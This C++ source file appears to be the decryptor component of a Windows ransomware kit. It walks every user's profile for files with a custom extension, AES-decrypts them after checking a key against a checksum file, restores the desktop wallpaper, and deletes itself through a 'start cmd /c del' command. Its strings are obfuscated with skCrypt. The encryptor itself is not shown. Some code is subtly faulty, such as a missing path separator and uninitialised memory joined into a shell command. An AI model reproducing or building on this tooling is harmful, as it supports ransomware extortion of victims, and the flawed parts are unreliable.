#include "headers.h"

using namespace std;

vector<string> globalAllFiles;
mutex allFilesMutex;

string Exec(const char* cmd) {
    string result = "";
    FILE* CommandResult = _popen(cmd, skCrypt("rt"));
    char line[256];
    while (fgets(line, 256, CommandResult))
        result += line;
    _pclose(CommandResult);
    return result;
}

bool FileExists(const string& name) {
    struct stat buffer;
    return stat(name.c_str(), &buffer) == 0;
}

vector<string> Split(const string& s, const char& delimiter) {
    size_t start = 0;
    size_t end = s.find_first_of(delimiter);
    vector<string> output;

    while (end <= string::npos) {
        output.emplace_back(s.substr(start, end - start));

        if (end == string::npos)
            break;

        start = end + 1;
        end = s.find_first_of(delimiter, start);
    }

    return output;
}

vector<vector<string>> VectorSplitter(const vector<string>& baseVector, int parts) {
    vector<vector<string>> result;
    int length = baseVector.size() / parts;
    int remain = baseVector.size() % parts;
    int begin = 0, end = 0;
    for (int i = 0; i < min(parts, baseVector.size()); ++i) {
        end += (remain > 0) ? (length + !!(remain--)) : length;
        result.push_back(vector<string>(baseVector.begin() + begin, baseVector.begin() + end));
        begin = end;
    }
    return result;
}

void DeleteMe(const string& myPath) {
    system(((string)(char*)calloc(myPath.length() + 11, sizeof(char)) + (string)skCrypt("start cmd /c \"del ") + myPath + (string)skCrypt(" & exit\"")).c_str());
}

void DecryptFiles(const vector<string>& files, const string& key) {
    for (string file : files) {

        HANDLE hFile = CreateFileA(file.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (GetLastError() == ERROR_FILE_NOT_FOUND || GetFileSize(hFile, NULL) > MAX_FILE_SIZE) {
            CloseHandle(hFile);
            continue;
        }
        CloseHandle(hFile);

        ifstream fin(file, ios::in);
        string data((istreambuf_iterator<char>(fin)), istreambuf_iterator<char>());
        fin.close();
        vector<BYTE> content = base64_decode(aes_decrypt(key, data, IV));
        
        string newFileName = "";
        for (int i = 0; i < file.size() - (FILE_EXTENSION).size(); i++)
            newFileName += file[i];
        ofstream fout(newFileName, ios::binary | ios::out);
        fout.write((const char*)&content[0], content.size());
        fout.close();

        if (remove(file.c_str()) != 0)
            DeleteFileA(file.c_str());
    }
}

bool CheckKey(const string& key) {
    try {
        DecryptFiles({ CHECKSUM_FILE + FILE_EXTENSION }, key);
    }
    catch (...) {
        return false;
    }
    ifstream fin(CHECKSUM_FILE, ios::in);
    string data((istreambuf_iterator<char>(fin)), istreambuf_iterator<char>());
    fin.close();
    if (remove((CHECKSUM_FILE).c_str()) != 0)
        DeleteFileA((CHECKSUM_FILE).c_str());
    return data == CHECK_CONTENT;
}

void RestoreWallpaper() {
    USES_CONVERSION_EX;
    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, A2W_EX((OLDWALLPAPER).c_str(), (OLDWALLPAPER).length()), SPIF_UPDATEINIFILE);
}

string GetUsername() {
    string result = (string)skCrypt("none");
    TCHAR  infoBuf[1600];
    DWORD  bufCharCount = 1600;

    if (GetUserName(infoBuf, &bufCharCount)) {
        wstring ws(&infoBuf[0]);
        result = string(ws.begin(), ws.end());
    }
    return result;
}

void GetAllFiles(const string& username) {
    vector<string> tmpFiles;

    for (string file : Split(Exec(((string)skCrypt("dir /b /s /a-d C:\\Users\\") + username).c_str()), '\n'))
        if ((string)skCrypt(".") + Split(file, '.').back() == FILE_EXTENSION)
            tmpFiles.push_back(file);

    allFilesMutex.lock();
    globalAllFiles.insert(globalAllFiles.end(), tmpFiles.begin(), tmpFiles.end());
    allFilesMutex.unlock();
}

vector<string> GetFiles(const string& mainDir) {
    vector<string> result;

    if (DEBUG && !PathIsDirectoryEmptyA((LPCSTR)mainDir.c_str())) {
        vector<string> files = Split(Exec(((string)skCrypt("dir /s /b /a-d ") + mainDir).c_str()), '\n');
        for (string file : files)
            if ((string)skCrypt(".") + Split(file, '.').back() == FILE_EXTENSION)
                result.push_back(file);
    }

    else {
        vector<thread> threads;
        for (string user : Split(Exec(skCrypt("dir /b /ad C:\\Users")), '\n')) {
            if (!FileExists((string)skCrypt("C:\\Users") + user))   /*directory does not exists (idk why)*/
                continue;
            if (PathIsDirectoryEmptyA((LPCSTR)((string)skCrypt("C:\\Users\\") + user).c_str()))   /*directory is empty*/
                continue;

            threads.push_back(thread(GetAllFiles, user));
        }
        for (int i = 0; i < threads.size(); i++)
            threads[i].join();

        result.insert(result.end(), globalAllFiles.begin(), globalAllFiles.end());
    }

    return result;
}
